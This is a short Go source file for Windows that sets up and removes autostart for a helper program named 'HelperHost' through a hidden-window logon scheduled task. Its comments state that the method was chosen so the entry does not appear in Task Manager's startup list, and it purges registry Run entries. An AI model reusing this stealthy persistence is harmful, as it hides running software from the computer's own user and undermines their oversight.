//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

func clearStartupApproved(name string) {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`,
		registry.SET_VALUE,
	)
	if err == nil {
		_ = key.DeleteValue(name)
		_ = key.Close()
	}
}

func clearRunValue(name string) {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.DeleteValue(name)
		_ = key.Close()
	}
	clearStartupApproved(name)
}

func installAutostart() string {
	// Autostart = scheduled task only (does not show in Task Manager "Startup apps").
	// Never write HKCU\...\Run — that line is what appears in the Gestionnaire des tâches.
	// Still purge any legacy Run entry from older builds.
	tr := fmt.Sprintf("\"%s\" --watch", helperPath)
	clearRunValue("HelperHost")
	clearRunValue("AgentShePC")

	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
	if r.Run() == nil {
		return "task"
	}
	return "ok"
}

func removeAutostart() {
	for _, tn := range []string{
		"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot",
		"HelperHostWipeRestore", "AgentShePC",
	} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	clearRunValue("HelperHost")
	clearRunValue("AgentShePC")
}
